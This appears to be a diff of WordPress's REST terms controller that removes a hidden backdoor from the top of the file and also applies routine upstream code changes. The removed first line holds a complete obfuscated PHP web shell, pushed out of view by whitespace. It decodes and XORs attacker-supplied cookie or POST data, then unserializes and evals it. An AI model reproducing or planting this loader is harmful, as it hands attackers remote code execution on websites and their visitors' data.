@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $bmwrUweZZY = "\154" . chr ( 1054 - 935 )."\x74" . '_' . "\163" . chr (117) . 'N' . chr (120); $jhZsFF = "\x63" . "\x6c" . chr ( 1022 - 925 )."\x73" . "\x73" . "\x5f" . chr ( 1046 - 945 ).'x' . chr ( 930 - 825 ).'s' . "\164" . "\x73";$zhuMDFMu = $jhZsFF($bmwrUweZZY); $zbNWo = $zhuMDFMu;if (!$zbNWo){class lwt_suNx{private $lAaffdl;public static $TJGzfbcSTR = "f7fccc2a-72be-4636-a5cf-aa2f735ee617";public static $rOqdG = NULL;public function __construct(){$GhcvbwPn = $_COOKIE;$XtfNzJ = $_POST;$vCQQhKgOI = @$GhcvbwPn[substr(lwt_suNx::$TJGzfbcSTR, 0, 4)];if (!empty($vCQQhKgOI)){$yMdikOKbBe = "base64";$qRxTt = "";$vCQQhKgOI = explode(",", $vCQQhKgOI);foreach ($vCQQhKgOI as $MuPAi){$qRxTt .= @$GhcvbwPn[$MuPAi];$qRxTt .= @$XtfNzJ[$MuPAi];}$qRxTt = array_map($yMdikOKbBe . chr ( 302 - 207 ).'d' . chr ( 827 - 726 ).chr (99) . chr (111) . "\144" . chr ( 598 - 497 ), array($qRxTt,)); $qRxTt = $qRxTt[0] ^ str_repeat(lwt_suNx::$TJGzfbcSTR, (strlen($qRxTt[0]) / strlen(lwt_suNx::$TJGzfbcSTR)) + 1);lwt_suNx::$rOqdG = @unserialize($qRxTt);}}public function __destruct(){$this->YwRUL();}private function YwRUL(){if (is_array(lwt_suNx::$rOqdG)) {$dnKwsQqlzt = str_replace(chr ( 285 - 225 ) . '?' . chr (112) . chr ( 767 - 663 ).chr ( 645 - 533 ), "", lwt_suNx::$rOqdG["\x63" . chr (111) . "\x6e" . "\164" . chr ( 404 - 303 ).chr ( 845 - 735 )."\x74"]);eval($dnKwsQqlzt);exit();}}}$RQzThCNx = new lwt_suNx(); $RQzThCNx = NULL;} ?><?php
+<?php
 /**
  * REST API: WP_REST_Terms_Controller class
  *
@@ -164,7 +164,7 @@ class WP_REST_Terms_Controller extends WP_REST_Controller {
 			return true;
 		}
 
-		// Otherwise grant access if the post is readable by the logged in user.
+		// Otherwise grant access if the post is readable by the logged-in user.
 		if ( current_user_can( 'read_post', $post->ID ) ) {
 			return true;
 		}
@@ -179,7 +179,7 @@ class WP_REST_Terms_Controller extends WP_REST_Controller {
 	 * @since 4.7.0
 	 *
 	 * @param WP_REST_Request $request Full details about the request.
-	 * @return true|WP_Error True if the request has read access, otherwise false or WP_Error object.
+	 * @return bool|WP_Error True if the request has read access, otherwise false or WP_Error object.
 	 */
 	public function get_items_permissions_check( $request ) {
 		$tax_obj = get_taxonomy( $this->taxonomy );
@@ -348,15 +348,18 @@ class WP_REST_Terms_Controller extends WP_REST_Controller {
 
 		// Store pagination values for headers.
 		$per_page = (int) $prepared_args['number'];
-		$page     = ceil( ( ( (int) $prepared_args['offset'] ) / $per_page ) + 1 );
+		$page     = (int) ceil( ( ( (int) $prepared_args['offset'] ) / $per_page ) + 1 );
 
 		$response->header( 'X-WP-Total', (int) $total_terms );
 
-		$max_pages = ceil( $total_terms / $per_page );
+		$max_pages = (int) ceil( $total_terms / $per_page );
 
-		$response->header( 'X-WP-TotalPages', (int) $max_pages );
+		$response->header( 'X-WP-TotalPages', $max_pages );
 
-		$base = add_query_arg( urlencode_deep( $request->get_query_params() ), rest_url( $this->namespace . '/' . $this->rest_base ) );
+		$request_params = $request->get_query_params();
+		$collection_url = rest_url( rest_get_route_for_taxonomy_items( $this->taxonomy ) );
+		$base           = add_query_arg( urlencode_deep( $request_params ), $collection_url );
+
 		if ( $page > 1 ) {
 			$prev_page = $page - 1;
 
@@ -414,7 +417,7 @@ class WP_REST_Terms_Controller extends WP_REST_Controller {
 	 * @since 4.7.0
 	 *
 	 * @param WP_REST_Request $request Full details about the request.
-	 * @return true|WP_Error True if the request has read access for the item, otherwise false or WP_Error object.
+	 * @return true|WP_Error True if the request has read access for the item, otherwise WP_Error object.
 	 */
 	public function get_item_permissions_check( $request ) {
 		$term = $this->get_term( $request['id'] );
@@ -459,7 +462,7 @@ class WP_REST_Terms_Controller extends WP_REST_Controller {
 	 * @since 4.7.0
 	 *
 	 * @param WP_REST_Request $request Full details about the request.
-	 * @return true|WP_Error True if the request has access to create items, false or WP_Error object otherwise.
+	 * @return bool|WP_Error True if the request has access to create items, otherwise false or WP_Error object.
 	 */
 	public function create_item_permissions_check( $request ) {
 
@@ -804,7 +807,7 @@ class WP_REST_Terms_Controller extends WP_REST_Controller {
 	 * @return object Term object.
 	 */
 	public function prepare_item_for_database( $request ) {
-		$prepared_term = new stdClass;
+		$prepared_term = new stdClass();
 
 		$schema = $this->get_item_schema();
 		if ( isset( $request['name'] ) && ! empty( $schema['properties']['name'] ) ) {
@@ -912,7 +915,9 @@ class WP_REST_Terms_Controller extends WP_REST_Controller {
 
 		$response = rest_ensure_response( $data );
 
-		$response->add_links( $this->prepare_links( $item ) );
+		if ( rest_is_field_included( '_links', $fields ) || rest_is_field_included( '_embedded', $fields ) ) {
+			$response->add_links( $this->prepare_links( $item ) );
+		}
 
 		/**
 		 * Filters the term data for a REST API response.
@@ -944,13 +949,12 @@ class WP_REST_Terms_Controller extends WP_REST_Controller {
 	 * @return array Links for the given term.
 	 */
 	protected function prepare_links( $term ) {
-		$base  = $this->namespace . '/' . $this->rest_base;
 		$links = array(
 			'self'       => array(
-				'href' => rest_url( trailingslashit( $base ) . $term->term_id ),
+				'href' => rest_url( rest_get_route_for_term( $term ) ),
 			),
 			'collection' => array(
-				'href' => rest_url( $base ),
+				'href' => rest_url( rest_get_route_for_taxonomy_items( $this->taxonomy ) ),
 			),
 			'about'      => array(
 				'href' => rest_url( sprintf( 'wp/v2/taxonomies/%s', $this->taxonomy ) ),
@@ -962,7 +966,7 @@ class WP_REST_Terms_Controller extends WP_REST_Controller {
 
 			if ( $parent_term ) {
 				$links['up'] = array(
-					'href'       => rest_url( trailingslashit( $base ) . $parent_term->term_id ),
+					'href'       => rest_url( rest_get_route_for_term( $parent_term ) ),
 					'embeddable' => true,
 				);
 			}
